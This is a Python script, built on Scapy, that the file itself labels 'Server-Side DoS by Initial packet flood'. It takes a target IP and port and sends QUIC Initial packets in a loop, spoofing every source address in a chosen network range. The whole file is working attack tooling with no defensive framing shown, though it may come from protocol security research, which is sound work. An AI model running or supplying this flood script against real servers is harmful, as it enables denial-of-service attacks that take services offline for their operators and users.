from scapy.all import IP, UDP, send
from scapy.layers.inet6 import IPv6
from scapy.packet import Raw
from frames import CryptoFrame, PaddingFrame, PingFrame

from packets import QUIC
from transport_ext import QUIC_Ext_Transport
from varint import VarInt
from scapy.layers.tls.crypto.hkdf import TLS13_HKDF
import time

import argparse
import logging
import re
from ipaddress import IPv4Address, IPv4Network
import secrets

# I know this could be shorter, but the verbosity is intended.
# The first group give the network base IP, the second the network subnet.
# Remember, round brackets define a group.
#CIDR_REGEX = "^([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\/([0-9]|[1-2][0-9]|3[0-2])$"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Server-Side DoS by Initial packet flood'
    )
    parser.add_argument(
        '-t',
        '--target',
        type=str,
        required=True,
        help='destination IP used'
    )
    parser.add_argument(
        '-n',
        '--nclient',
        type=int, 
        default=20,
        help='number of client'
    )
    parser.add_argument(
        '-d',
        '--delay',
        type=int,
        default=20,
        help='Time in milliseconds to wait before next packet'
    )
    parser.add_argument(
        '-sport',
        "--src-port",
        type=int,
        default=60060, #Random chosen port
        help="source port",
    )
    parser.add_argument(
        '-dport',
        "--dst-port",
        type=int,
        default=6121,
        help="destination port (defaults to 6121)",
    )
    parser.add_argument(
        '-net',
        "--network",
        type=str,
        #required=True,
        default="10.10.10.0/24",
        help="network to use IPs. Use CIDR notation i.e. 192.168.0.0/24",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="increase logging verbosity"
    )
    args = parser.parse_args()

    logging.basicConfig(
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
        level=logging.DEBUG if args.verbose else logging.INFO,
    )
    
    #network_cidr = re.match(CIDR_REGEX, args.network)
    
    #if network_cidr is None:
    #    logging.error("Invalid network parameter used, use CIDR notation for network argument")
    #    raise SystemExit()
    
    #network_address = network_cidr.group(1)
    #subnet_bits = network_cidr.group(2)
    
    network = IPv4Network(args.network)
    target = IPv4Address(args.target)
    delay = args.delay/500
    logging.info(f"network: {network.network_address}")
    logging.info(f"subnet: {network.netmask}")
    


for ip in network:
        src_ip = str(ip) # spoofed source IP address
        dst_ip =  args.target # destination IP address

        src_port = args.src_port # source port
        dst_port = args.dst_port # destination port
        
        DCID = bytes.fromhex(secrets.token_hex(16))
        SCID = bytes.fromhex(secrets.token_hex(16))

        ip_packet = IP(src=src_ip, dst=dst_ip)
        udp_packet = UDP(sport=src_port, dport=dst_port)
        
        quic_packet = QUIC.initial(DCID,SCID)

        ppacket = ip_packet / udp_packet / quic_packet
        
        send(ppacket, verbose = True, count=2)
        time.sleep(delay)
